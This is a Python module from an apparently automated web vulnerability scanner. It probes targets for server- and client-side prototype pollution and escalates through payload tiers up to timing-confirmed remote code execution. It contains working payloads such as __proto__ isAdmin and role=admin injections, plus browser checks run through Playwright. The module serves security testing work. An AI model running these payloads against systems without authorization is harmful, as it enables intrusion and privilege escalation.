"""
Prototype Pollution Agent - I/O functions

All functions here are async and perform network I/O or interact with
external services (HTTP, browser/Playwright, LLM, filesystem).

Dependencies (session, browser_manager, llm_client) are passed as explicit
parameters -- never accessed via global state.

Responsibilities:
- HTTP testing for JSON body and query param pollution
- Response time measurement for timing attacks
- Client-side Playwright-based pollution detection
- Autonomous parameter discovery
- LLM-powered deduplication
- Queue draining
- Report file writing
"""

import asyncio
import json
import time
import urllib.parse
from typing import Dict, List, Optional, Any, Tuple
from pathlib import Path

import aiohttp

from bugtrace.agents.prototype_pollution.core import (
    POLLUTION_MARKER,
    TIER_SEVERITY,
    get_payloads_for_tier,
    get_query_param_payloads,
    verify_pollution_in_text,
    check_rce_output,
    severity_rank,
    fallback_fingerprint_dedup,
    build_dedup_prompt,
    build_client_side_finding,
)
from bugtrace.core.http_orchestrator import orchestrator, DestinationType
from bugtrace.utils.logger import get_logger

logger = get_logger("agents.prototype_pollution")


# ============================================================================
# JSON BODY VECTOR TESTING (I/O)
# ============================================================================

# I/O
async def discover_json_body_vector(url: str) -> Optional[Dict]:
    """
    Check if endpoint accepts JSON POST requests.

    Most prototype pollution occurs via JSON body, so this is priority check.

    Args:
        url: Target URL

    Returns:
        Vector dict or None
    """
    try:
        async with orchestrator.session(DestinationType.TARGET) as session:
            async with session.post(
                url,
                json={"test": "probe"},
                headers={"Content-Type": "application/json"},
                timeout=aiohttp.ClientTimeout(total=5)
            ) as response:
                if response.status not in (415, 405):
                    return {
                        "type": "JSON_BODY",
                        "method": "POST",
                        "source": "ENDPOINT_PROBE",
                        "confidence": "HIGH",
                        "status_code": response.status,
                    }
    except aiohttp.ClientError as e:
        logger.debug(f"JSON body probe failed: {e}")
    except asyncio.TimeoutError:
        logger.debug("JSON body probe timeout")

    return None


# I/O
async def discover_query_pollution_vectors(url: str) -> List[Dict]:
    """
    Test if endpoint processes __proto__ in query parameters.

    Some endpoints parse query strings with vulnerable libraries (qs, querystring).

    Args:
        url: Target URL

    Returns:
        List of vector dicts
    """
    vectors = []

    try:
        async with orchestrator.session(DestinationType.TARGET) as session:
            test_url = f"{url}{'&' if '?' in url else '?'}__proto__[test]=probe"

            async with session.get(
                test_url,
                timeout=aiohttp.ClientTimeout(total=5)
            ) as response:
                if response.status < 400:
                    vectors.append({
                        "type": "QUERY_PROTO",
                        "method": "GET",
                        "source": "QUERY_PROBE",
                        "confidence": "MEDIUM",
                        "test_url": test_url,
                    })
    except aiohttp.ClientError as e:
        logger.debug(f"Query pollution probe failed: {e}")
    except asyncio.TimeoutError:
        logger.debug("Query pollution probe timeout")

    return vectors


# I/O
async def fetch_response_content(url: str) -> Optional[str]:
    """
    Fetch response content for pattern analysis.

    Args:
        url: Target URL

    Returns:
        Response text or None
    """
    try:
        async with orchestrator.session(DestinationType.TARGET) as session:
            async with session.get(
                url,
                timeout=aiohttp.ClientTimeout(total=10)
            ) as response:
                return await response.text()
    except (aiohttp.ClientError, asyncio.TimeoutError) as e:
        logger.debug(f"Response fetch failed: {e}")
    return None


# I/O
async def test_json_payload(
    url: str,
    payload_info: Dict,
    tier: str,
) -> Optional[Dict]:
    """
    Test a single JSON payload and check for pollution confirmation.

    Args:
        url: Target URL
        payload_info: Payload dict with 'payload', 'technique', etc.
        tier: Tier name for severity lookup

    Returns:
        Result dict or None
    """
    payload_obj = payload_info.get("payload", {})
    technique = payload_info.get("technique", "unknown")

    try:
        start_time = time.time()

        async with orchestrator.session(DestinationType.TARGET) as session:
            async with session.post(
                url,
                json=payload_obj,
                headers={"Content-Type": "application/json"},
                timeout=aiohttp.ClientTimeout(total=15)
            ) as response:
                elapsed = time.time() - start_time
                resp_text = await response.text()

                # Check for pollution confirmation
                pollution_confirmed = verify_pollution_in_text(resp_text, POLLUTION_MARKER)

                # Check for RCE timing attack success (sleep 5)
                rce_timing = elapsed >= 4.5 and "rce_timing" in technique

                # Check for RCE command output
                rce_output = check_rce_output(resp_text)

                if pollution_confirmed or rce_timing or rce_output:
                    severity = TIER_SEVERITY.get(tier, "LOW")
                    if rce_timing or rce_output:
                        severity = "CRITICAL"

                    return {
                        "exploitable": True,
                        "type": "PROTOTYPE_POLLUTION",
                        "method": "JSON_BODY",
                        "payload": json.dumps(payload_obj),
                        "payload_obj": payload_obj,
                        "technique": technique,
                        "tier": tier,
                        "severity": severity,
                        "pollution_confirmed": pollution_confirmed,
                        "rce_confirmed": rce_timing or rce_output,
                        "rce_evidence": {
                            "timing_delay": elapsed if rce_timing else None,
                            "command_output": rce_output,
                        } if (rce_timing or rce_output) else None,
                        "test_url": url,
                        "status_code": response.status,
                        "http_request": f"POST {url}\nContent-Type: application/json\n\n{json.dumps(payload_obj, indent=2)}",
                        "http_response": f"HTTP/1.1 {response.status}\n\n{resp_text[:500]}...",
                    }

    except aiohttp.ClientError as e:
        logger.debug(f"JSON payload test failed: {e}")
    except asyncio.TimeoutError:
        logger.debug("Request timeout (potential timing attack)")
    except json.JSONDecodeError as e:
        logger.debug(f"JSON decode error: {e}")

    return None


# I/O
async def test_json_body_vector(url: str, verbose_emitter: Any = None) -> Optional[Dict]:
    """
    Test JSON body vector with tiered payloads.

    Follows stop-on-first-success pattern within each tier,
    but continues to higher tiers for severity escalation.

    Args:
        url: Target URL
        verbose_emitter: Optional verbose event emitter

    Returns:
        Best result dict or None
    """
    best_result = None

    for tier in ["pollution_detection", "encoding_bypass", "gadget_chain", "rce_exploitation"]:
        payloads = get_payloads_for_tier(tier)

        for payload_info in payloads:
            if payload_info.get("method") not in ("JSON_BODY", None):
                continue

            if verbose_emitter:
                verbose_emitter.progress(
                    "exploit.specialist.progress",
                    {"agent": "PrototypePollution", "tier": tier,
                     "technique": payload_info.get("technique", "")},
                    every=50,
                )

            result = await test_json_payload(url, payload_info, tier)

            if result and result.get("exploitable"):
                if not best_result or severity_rank(result.get("severity")) > severity_rank(best_result.get("severity")):
                    best_result = result

                # Stop this tier on first success
                break

        # If we found RCE, no need to continue
        if best_result and best_result.get("rce_confirmed"):
            break

    return best_result


# I/O
async def test_query_param_vector(url: str, param: str, verbose_emitter: Any = None) -> Optional[Dict]:
    """
    Test query parameter vector with pollution payloads.

    Args:
        url: Target URL
        param: Parameter name (default __proto__)
        verbose_emitter: Optional verbose event emitter

    Returns:
        Result dict or None
    """
    query_payloads = get_query_param_payloads(POLLUTION_MARKER)

    for query in query_payloads:
        if verbose_emitter:
            verbose_emitter.progress(
                "exploit.specialist.progress",
                {"agent": "PrototypePollution", "tier": "query_param", "payload": query[:60]},
                every=50,
            )

        test_url = f"{url}{'&' if '?' in url else '?'}{query}"

        try:
            async with orchestrator.session(DestinationType.TARGET) as session:
                async with session.get(
                    test_url,
                    timeout=aiohttp.ClientTimeout(total=5)
                ) as response:
                    resp_text = await response.text()

                    if verify_pollution_in_text(resp_text, POLLUTION_MARKER):
                        return {
                            "exploitable": True,
                            "type": "PROTOTYPE_POLLUTION",
                            "method": "QUERY_PARAM",
                            "param": param,
                            "payload": query,
                            "technique": "query_pollution",
                            "tier": "pollution_detection",
                            "severity": "MEDIUM",
                            "pollution_confirmed": True,
                            "rce_confirmed": False,
                            "test_url": test_url,
                            "status_code": response.status,
                            "http_request": f"GET {test_url}",
                            "http_response": f"HTTP/1.1 {response.status}\n\n{resp_text[:500]}...",
                        }

        except aiohttp.ClientError as e:
            logger.debug(f"Query param test failed: {e}")
        except asyncio.TimeoutError:
            logger.debug("Query param test timeout")

    return None


# ============================================================================
# SMART PROBE (I/O)
# ============================================================================

# I/O
async def smart_probe_pollution(url: str) -> bool:
    """
    Smart probe: 1-2 requests to test if endpoint processes __proto__ at all.

    Tests both query param and JSON body vectors with a harmless __proto__ probe.

    Args:
        url: Target URL

    Returns:
        True if endpoint shows any reaction to __proto__
    """
    error_signals = [
        "prototype", "__proto__", "polluted", "cannot set property",
        "cannot read property", "TypeError", "RangeError",
    ]

    try:
        async with orchestrator.session(DestinationType.TARGET) as session:
            # Step 1: Get baseline
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                baseline_text = await resp.text()
                baseline_status = resp.status
                baseline_len = len(baseline_text)

            # Step 2: Query param probe
            separator = "&" if "?" in url else "?"
            probe_url = f"{url}{separator}__proto__[btprobe]=1"

            async with session.get(probe_url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                probe_text = await resp.text()
                probe_status = resp.status

                if probe_status != baseline_status:
                    return True

                if abs(len(probe_text) - baseline_len) > 50:
                    return True

                if any(sig in probe_text.lower() for sig in error_signals):
                    return True

            # Step 3: JSON body probe
            try:
                json_payload = {"__proto__": {"btprobe": "1"}}
                async with session.post(
                    url,
                    json=json_payload,
                    headers={"Content-Type": "application/json"},
                    timeout=aiohttp.ClientTimeout(total=5)
                ) as resp:
                    json_probe_text = await resp.text()
                    json_probe_status = resp.status

                    if json_probe_status != baseline_status:
                        return True

                    if abs(len(json_probe_text) - baseline_len) > 50:
                        return True

                    if any(sig in json_probe_text.lower() for sig in error_signals):
                        return True
            except Exception:
                pass

            # No HTTP-level reaction -- try client-side PP via Playwright
            try:
                client_side = await smart_probe_client_side(url)
                if client_side:
                    return True
            except Exception as browser_err:
                logger.debug(f"Browser probe error: {browser_err}")

            return False

    except Exception as e:
        logger.debug(f"Smart probe error: {e}")
        return True  # On error, continue testing (be safe)


# I/O
async def smart_probe_client_side(url: str) -> bool:
    """
    Playwright-based client-side prototype pollution probe.

    Tests two vectors:
    1. ?__proto__[btCSPP]=1 (URL param based PP)
    2. ?filter={"__proto__":{"btCSPP":"1"}} (JSON param based PP via deepMerge)

    Args:
        url: Target URL

    Returns:
        True if client-side PP is confirmed
    """
    from bugtrace.tools.visual.browser import browser_manager

    pp_json = urllib.parse.quote('{"__proto__":{"btCSPP":"1"}}')
    json_params = ["filter", "config", "options", "data", "settings"]

    # Build probe URLs: test both the given URL and the origin HTML page
    from urllib.parse import urlparse as _parse_url
    parsed_origin = _parse_url(url)
    origin_html = f"{parsed_origin.scheme}://{parsed_origin.netloc}/"
    test_urls = [url]
    if origin_html.rstrip('/') != url.rstrip('/'):
        test_urls.append(origin_html)

    for test_url in test_urls:
        sep = "&" if "?" in test_url else "?"
        probe_vectors = [
            # Vector 1: URL param __proto__ pollution
            f"{sep}__proto__[btCSPP]=1",
        ]
        # Vector 2: JSON-based PP via common params
        for jp in json_params:
            probe_vectors.append(f"{sep}{jp}={pp_json}")

        for suffix in probe_vectors:
            probe_url = f"{test_url}{suffix}"
            try:
                async with browser_manager.get_page() as page:
                    await page.goto(probe_url, wait_until="load", timeout=15000)
                    await page.wait_for_timeout(1500)
                    pp_check_js = "(() => { try { return ({}).btCSPP === '1'; } catch(e) { return false; } })()"
                    result = await page.evaluate(pp_check_js)
                    if not result:
                        # Retry with longer wait
                        await page.wait_for_timeout(3000)
                        result = await page.evaluate(pp_check_js)
                    if result:
                        logger.info(f"Client-side PP CONFIRMED on {test_url} via: {suffix[:60]}")
                        return True
            except Exception as e:
                logger.debug(f"Client-side PP probe failed for {suffix[:40]}: {e}")

    return False


# I/O
async def exploit_client_side_pp(url: str, param: str) -> Optional[Dict]:
    """
    Exploit and document confirmed client-side prototype pollution.

    Tests multiple __proto__ payloads via Playwright to determine impact.

    Args:
        url: Target URL
        param: Parameter name

    Returns:
        Finding dict or None
    """
    from bugtrace.tools.visual.browser import browser_manager

    successful_payloads: List[str] = []
    impact_details: Dict[str, str] = {}

    # JSON-based payloads
    json_params = ["filter", "config", "options", "data", "settings"]
    json_payloads = [
        ('{"__proto__":{"isAdmin":true}}', "isAdmin", "true", "Privilege escalation via isAdmin flag"),
        ('{"__proto__":{"role":"admin"}}', "role", "admin", "Role escalation via role property"),
        ('{"__proto__":{"debug":true}}', "debug", "true", "Debug mode activation"),
        ('{"constructor":{"prototype":{"btPP":"1"}}}', "btPP", "1", "Constructor-based pollution"),
    ]

    # URL param-based payloads
    url_payloads = [
        ("__proto__[isAdmin]=true", "isAdmin", "true", "URL param PP: isAdmin"),
        ("__proto__[role]=admin", "role", "admin", "URL param PP: role"),
    ]

    separator = "&" if "?" in url else "?"

    # Test JSON-based payloads via common param names
    for json_val, prop, expected_val, desc in json_payloads:
        for json_param in json_params:
            try:
                encoded = urllib.parse.quote(json_val)
                test_url = f"{url}{separator}{json_param}={encoded}"
                async with browser_manager.get_page() as page:
                    await page.goto(test_url, wait_until="networkidle", timeout=10000)
                    check_js = f"(() => {{ try {{ return String(({{}}).{prop}); }} catch(e) {{ return ''; }} }})()"
                    result = await page.evaluate(check_js)
                    if result == expected_val:
                        payload_desc = f"{json_param}={json_val}"
                        successful_payloads.append(payload_desc)
                        impact_details[prop] = desc
                        break
            except Exception as e:
                logger.debug(f"Client-side PP payload failed: {e}")

    # Test URL param-based payloads
    for payload_qs, prop, expected_val, desc in url_payloads:
        if prop in impact_details:
            continue
        try:
            test_url = f"{url}{separator}{payload_qs}"
            async with browser_manager.get_page() as page:
                await page.goto(test_url, wait_until="networkidle", timeout=10000)
                check_js = f"(() => {{ try {{ return String(({{}}).{prop}); }} catch(e) {{ return ''; }} }})()"
                result = await page.evaluate(check_js)
                if result == expected_val:
                    successful_payloads.append(payload_qs)
                    impact_details[prop] = desc
        except Exception as e:
            logger.debug(f"Client-side PP payload failed: {e}")

    return build_client_side_finding(url, param, successful_payloads, impact_details)


# ============================================================================
# AUTONOMOUS PARAMETER DISCOVERY (I/O)
# ============================================================================

# I/O
async def discover_prototype_pollution_params(url: str) -> Dict[str, str]:
    """
    Prototype Pollution-focused parameter discovery for a given URL.

    Extracts ALL testable parameters from:
    1. URL query string
    2. HTML forms (input, textarea, select)
    3. Detects if endpoint accepts JSON POST bodies

    Args:
        url: Target URL

    Returns:
        Dict mapping param names to default values.
        Special key: "_accepts_json": True if endpoint accepts JSON POST
    """
    from bugtrace.tools.visual.browser import browser_manager
    from urllib.parse import urlparse, parse_qs
    from bs4 import BeautifulSoup

    all_params: Dict[str, str] = {}

    # 1. Extract URL query parameters
    try:
        parsed = urlparse(url)
        url_params = parse_qs(parsed.query)
        for param_name, values in url_params.items():
            all_params[param_name] = values[0] if values else ""
    except Exception as e:
        logger.warning(f"Failed to parse URL params: {e}")

    # 2. Fetch HTML and extract form parameters
    try:
        state = await browser_manager.capture_state(url)
        html = state.get("html", "")

        if html:
            soup = BeautifulSoup(html, "html.parser")

            for tag in soup.find_all(["input", "textarea", "select"]):
                param_name = tag.get("name")
                if param_name and param_name not in all_params:
                    input_type = tag.get("type", "text").lower()
                    if input_type not in ["submit", "button", "reset"]:
                        if "csrf" not in param_name.lower() and "token" not in param_name.lower():
                            default_value = tag.get("value", "")
                            all_params[param_name] = default_value

                            # Flag high-priority PP params
                            param_lower = param_name.lower()
                            pp_keywords = [
                                "obj", "data", "options", "config", "params", "settings",
                                "preferences", "merge", "extend", "clone", "copy", "assign",
                                "update", "proto", "constructor", "prototype",
                            ]
                            if any(keyword in param_lower for keyword in pp_keywords):
                                logger.info(f"High-priority PP param found: {param_name}")

    except Exception as e:
        logger.error(f"HTML parsing failed: {e}")

    # 3. Add common PP-relevant param names as synthetic candidates
    pp_common_params = [
        "filter", "config", "options", "data", "settings", "params",
        "query", "json", "args", "obj", "merge", "extend", "input",
        "payload", "body", "attributes", "properties", "fields",
    ]
    for common_param in pp_common_params:
        if common_param not in all_params:
            all_params[common_param] = ""

    # 4. Check if endpoint accepts JSON POST bodies
    json_accepted = await probe_json_acceptance(url)
    if json_accepted:
        all_params["_accepts_json"] = "true"
        logger.info(f"Endpoint accepts JSON POST - PP prime target")

    logger.info(f"Discovered {len(all_params)} params on {url}: {list(all_params.keys())}")
    return all_params


# I/O
async def probe_json_acceptance(url: str) -> bool:
    """
    Quick probe to check if endpoint accepts JSON POST requests.

    Args:
        url: Target URL

    Returns:
        True if JSON is accepted
    """
    try:
        async with orchestrator.session(DestinationType.TARGET) as session:
            async with session.post(
                url,
                json={"test": "probe"},
                headers={"Content-Type": "application/json"},
                timeout=aiohttp.ClientTimeout(total=3)
            ) as response:
                return response.status not in (415, 405)
    except (aiohttp.ClientError, asyncio.TimeoutError):
        return False


# ============================================================================
# LLM DEDUPLICATION (I/O)
# ============================================================================

# I/O
async def llm_analyze_and_dedup(
    wet_findings: List[Dict],
    scan_context: str,
    tech_stack: Dict,
    prime_directive: str,
    dedup_context: str,
) -> List[Dict]:
    """
    Use LLM to intelligently deduplicate Prototype Pollution findings.

    Args:
        wet_findings: WET findings to deduplicate
        scan_context: Scan context
        tech_stack: Technology stack context
        prime_directive: Agent prime directive
        dedup_context: Agent dedup context

    Returns:
        Deduplicated list
    """
    from bugtrace.core.llm_client import llm_client

    prompt, system_prompt = build_dedup_prompt(
        wet_findings, tech_stack, prime_directive, dedup_context
    )

    try:
        response = await llm_client.generate(
            prompt=prompt,
            system_prompt=system_prompt,
            module_name="PROTOTYPE_POLLUTION_DEDUP",
            temperature=0.2,
        )

        result = json.loads(response)
        dry_list = result.get("findings", [])

        if dry_list:
            logger.info(f"LLM deduplication successful: {len(wet_findings)} -> {len(dry_list)}")
            return dry_list
        else:
            logger.warning("LLM returned empty list, using fallback")
            return fallback_fingerprint_dedup(wet_findings)

    except Exception as e:
        logger.warning(f"LLM deduplication failed: {e}, using fallback")
        return fallback_fingerprint_dedup(wet_findings)


# ============================================================================
# QUEUE DRAINING (I/O)
# ============================================================================

# I/O
async def drain_queue(queue: Any, max_wait: float = 300.0) -> List[Dict]:
    """
    Drain all WET findings from a queue.

    Args:
        queue: Queue object with depth() and dequeue() methods
        max_wait: Maximum wait time in seconds

    Returns:
        List of drained WET findings
    """
    wet_findings: List[Dict] = []

    wait_start = time.monotonic()
    while (time.monotonic() - wait_start) < max_wait:
        if queue.depth() if hasattr(queue, 'depth') else 0 > 0:
            break
        await asyncio.sleep(0.5)

    logger.info(f"Queue has {queue.depth() if hasattr(queue, 'depth') else 0} items, starting drain...")

    stable_empty_count = 0
    drain_start = time.monotonic()

    while stable_empty_count < 10 and (time.monotonic() - drain_start) < max_wait:
        item = await queue.dequeue(timeout=0.5)

        if item is None:
            stable_empty_count += 1
            continue

        stable_empty_count = 0

        finding = item.get("finding", {}) if isinstance(item, dict) else {}
        if finding:
            wet_findings.append(finding)

    logger.info(f"Drained {len(wet_findings)} WET findings from queue")
    return wet_findings


# ============================================================================
# REPORT WRITING (I/O)
# ============================================================================

# I/O
async def write_specialist_report(report: Dict, report_path: Path) -> None:
    """
    Write specialist report to disk.

    Args:
        report: Report dict to serialize
        report_path: Path to write the report file
    """
    import aiofiles

    report_path.parent.mkdir(parents=True, exist_ok=True)

    async with aiofiles.open(report_path, "w") as f:
        await f.write(json.dumps(report, indent=2))

    logger.info(f"Specialist report saved: {report_path}")
